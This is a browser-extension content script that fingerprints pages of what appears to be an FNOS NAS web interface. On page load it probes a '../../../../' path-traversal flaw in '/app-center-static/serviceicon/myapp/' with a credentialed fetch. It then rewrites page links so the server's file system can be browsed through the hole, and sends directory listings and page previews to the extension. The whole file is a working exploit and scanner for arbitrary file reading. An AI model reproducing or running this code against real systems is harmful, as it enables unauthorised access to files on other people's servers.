(() => {
  const api = (typeof browser !== 'undefined') ? browser : chrome;

  const FINGERPRINT = "myNav.indexOf('msie')";
  const FINGERPRINT2 = "myNav.indexOf('trident')";
  const VULN_BASE_PATH = "/app-center-static/serviceicon/myapp/%7B0%7D/";
  const VULN_PARAM_PREFIX = "?size=../../../../";

  function checkFingerprint() {
    const html = document.documentElement?.innerHTML || "";
    return html.includes(FINGERPRINT) && html.includes(FINGERPRINT2);
  }

  function isVulnPath() {
    return location.pathname.includes('/app-center-static/serviceicon/myapp/') && 
           location.search.includes('size=');
  }

  function extractSubPath() {
    const search = decodeURIComponent(location.search);
    const match = search.match(/[?&]size=(?:\.\.\/){4}(.*)$/);
    if (!match) return "";
    let subPath = match[1];
    const qIndex = subPath.indexOf('?');
    if (qIndex !== -1) subPath = subPath.substring(0, qIndex);
    return subPath.replace(/^\/+/, '');
  }

  function buildVulnUrl(subPath) {
    const cleanPath = (subPath || '').replace(/^\/+/, '');
    return location.origin + VULN_BASE_PATH + VULN_PARAM_PREFIX + cleanPath;
  }

  // 从href中提取纯文件名/目录名
  function extractFileName(href) {
    if (!href) return null;
    
    // 如果是已修复的漏洞URL，提取最后的文件名部分
    const vulnMatch = href.match(/[?&]size=(?:\.\.\/){4}.*?([^\/]+\/?)$/);
    if (vulnMatch) {
      return vulnMatch[1];
    }
    
    // 如果是完整URL，跳过
    if (/^(https?:)?\/\//i.test(href)) return null;
    
    // 如果是特殊协议，跳过
    if (/^(#|javascript:|mailto:|data:)/i.test(href)) return null;
    
    // 如果是绝对路径，跳过
    if (href.startsWith('/')) return null;
    
    // 如果包含://，跳过
    if (href.includes('://')) return null;
    
    // 父目录，跳过
    if (href === '../' || href === '..') return null;
    
    // 返回清理后的href
    return href.trim();
  }

  // 解析目录列表 - 在修复之前调用
  function parseDirectoryListing() {
    const links = [];
    const anchors = document.querySelectorAll('a[href]');
    
    anchors.forEach(a => {
      // 获取原始href属性（不是解析后的完整URL）
      const rawHref = a.getAttribute('href');
      const name = a.textContent?.trim() || '';
      
      const fileName = extractFileName(rawHref);
      if (!fileName) return;
      
      // 只接受简单的单级路径: filename.ext 或 dirname/
      if (!/^[^\/\?#]+\/?$/.test(fileName)) return;
      
      links.push({ 
        name: name || fileName, 
        href: fileName, 
        isDir: fileName.endsWith('/') 
      });
    });
    
    return links;
  }

  function fixPageLinks() {
    if (!isVulnPath()) return;

    const currentSubPath = extractSubPath();
    const links = document.querySelectorAll('a[href]:not([data-vuln-fixed])');

    links.forEach(link => {
      const rawHref = link.getAttribute('href');
      
      if (!rawHref) return;
      
      // 已经是完整URL且包含漏洞路径，跳过
      if (rawHref.includes(VULN_BASE_PATH) && rawHref.includes('size=')) {
        link.dataset.vulnFixed = 'true';
        return;
      }
      
      // 跳过完整URL
      if (/^(https?:)?\/\//i.test(rawHref)) return;
      if (/^(#|javascript:|mailto:|data:)/i.test(rawHref)) return;
      if (rawHref.startsWith('/')) return;

      // 处理返回上级
      if (rawHref === '../' || rawHref === '..') {
        const parts = currentSubPath.split('/').filter(p => p);
        if (parts.length > 0) {
          parts.pop();
          const parentPath = parts.length > 0 ? parts.join('/') + '/' : '';
          link.href = buildVulnUrl(parentPath);
          link.dataset.vulnFixed = 'true';
        }
        return;
      }

      // 简单相对路径
      if (/^[^\/\?#]+\/?$/.test(rawHref)) {
        let basePath = currentSubPath;
        if (basePath && !basePath.endsWith('/')) basePath += '/';
        link.href = buildVulnUrl(basePath + rawHref);
        link.dataset.vulnFixed = 'true';
      }
    });
  }

  function observeLinks() {
    if (!isVulnPath()) return;
    let debounceTimer = null;
    const observer = new MutationObserver(() => {
      clearTimeout(debounceTimer);
      debounceTimer = setTimeout(fixPageLinks, 100);
    });
    observer.observe(document.body, { childList: true, subtree: true });
  }

  async function probeVuln() {
    const url = location.origin + VULN_BASE_PATH + VULN_PARAM_PREFIX;
    try {
      const resp = await fetch(url, { method: 'GET', credentials: 'include' });
      const text = await resp.text().catch(() => '');
      const hasLinks = /<a\s+href=/i.test(text);
      const hasPre = /<pre>/i.test(text);
      const isVuln = resp.ok && text.length > 50 && (hasLinks || hasPre);
      return { probed: true, url, status: resp.status, length: text.length, vulnerable: isVuln, preview: text.substring(0, 3000) };
    } catch (e) {
      return { probed: true, url, status: 0, vulnerable: false, error: e.message };
    }
  }

  async function main() {
    if (isVulnPath()) {
      const subPath = extractSubPath();
      
      // ⚠️ 先解析原始链接
      const links = parseDirectoryListing();
      
      // 再修复DOM
      fixPageLinks();
      observeLinks();
      
      const html = document.body?.innerHTML || "";

      api.runtime.sendMessage({
        type: "FNOS_DIRECTORY_LISTING",
        origin: location.origin,
        result: {
          origin: location.origin,
          currentUrl: location.href,
          subPath: subPath,
          time: new Date().toISOString(),
          vulnerable: true,
          isListing: true,
          links: links,
          preview: html.substring(0, 3000)
        }
      }).catch(() => {});
      return;
    }

    if (!checkFingerprint()) return;
    const probeResult = await probeVuln();
    api.runtime.sendMessage({
      type: "FNOS_PROBE_RESULT",
      origin: location.origin,
      result: { origin: location.origin, time: new Date().toISOString(), fingerprint: true, subPath: "", ...probeResult }
    }).catch(() => {});
  }

  if (document.readyState === 'complete') {
    setTimeout(main, 200);
  } else {
    window.addEventListener('load', () => setTimeout(main, 200));
  }

  api.runtime.onMessage.addListener((msg, sender, sendResponse) => {
    if (msg.type === "FNOS_REFRESH_LISTING") {
      main().then(() => sendResponse({ ok: true })).catch(() => sendResponse({ ok: false }));
      return true;
    }
  });
})();
